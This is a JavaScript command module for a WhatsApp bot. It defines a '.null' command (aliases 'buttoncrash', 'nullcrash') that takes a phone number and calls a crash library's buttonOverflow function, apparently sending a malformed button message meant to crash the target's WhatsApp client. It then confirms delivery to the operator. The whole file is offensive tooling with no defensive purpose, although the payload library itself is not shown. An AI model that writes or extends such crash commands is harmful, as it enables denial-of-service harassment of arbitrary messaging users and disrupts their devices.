'use strict';
const { CrashLib } = require('../../lib/crashlib');

module.exports = {
    name: 'null',
    aliases: ['button', 'buttoncrash', 'nullcrash'],
    category: 'crash',
    desc: 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ ᴄʀᴀsʜ',
    usage: '.null <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const target = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net' || msg.chat;
        
        let crashLib = global.getCrashLib?.();
        if (!crashLib) {
            crashLib = new CrashLib(sock);
        }
        
        await sock.sendMessage(ctx.from, { text: '💥 sᴇɴᴅɪɴɢ ʙᴜᴛᴛᴏɴ ᴄʀᴀsʜ...' }, { quoted: msg });
        
        try {
            await crashLib.buttonOverflow(target);
            return sock.sendMessage(ctx.from, { text: '✅ ʙᴜᴛᴛᴏɴ ᴄʀᴀsʜ sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};